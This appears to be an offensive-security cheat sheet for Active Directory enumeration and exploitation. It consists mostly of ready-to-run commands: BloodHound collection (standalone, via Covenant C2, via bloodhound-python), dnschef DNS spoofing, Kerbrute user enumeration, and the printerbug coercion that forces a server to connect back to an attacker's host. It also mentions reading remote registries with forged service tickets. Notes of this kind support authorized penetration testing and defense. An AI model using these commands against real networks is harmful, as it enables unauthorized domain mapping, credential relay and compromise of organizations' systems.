# Domain Enum & Exploitation

### Bloodhound

#### Standalone

```text
Sharhound.exe -c all,gpolocalgroup
```

#### Via Covenant

```text
Assembly /assemblyname:"winsrv" /parameters:"\"-c All GPOLocalGroup\""
```

#### Via Impacket

```text
bloodhound-python -c all -u <user> -p <password> -d <domain> -dc <> -ns <optional nameserver>
```

Sometimes this results in a dns timeout, in this case we can use dnschef.py:

```text
sudo sh -c 'python3 dnschef.py --fakeip <dc ip> --fakedomains <domain> -q'
```

### ACLight

[ACLight ](https://github.com/cyberark/ACLight)is a great script that finds high privileged accounts by using PowerView and then creates a report.

### Find OS Versions

```text
[Get-ADComputer -Filter {(OperatingSystem -like '*Server 2012*')} -Properties * | sort-Object | Select-Object DNSHostName, IPv4Address, whenCreated, OperatingSystem]
```

### Userenum

#### Kerbrute

```text
kerbrute userenum -d <domain> <userlist> --dc <>
```

### Printerbug

Explore a flaw in msrpc to get a connect back from a vulnerable server via [printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py):

```bash
python printerbug.py <domain>/<user>@<rhost> <lhost>
```

### Read Remote Registry

We can read a remote machines registry with  Service Ticket \(which can be generated with "getST.py" if we have the creds or hash of a user\) and "runas /netonly". This only works if the user we are targeting has a session on the target system \(check in bloodhound\).

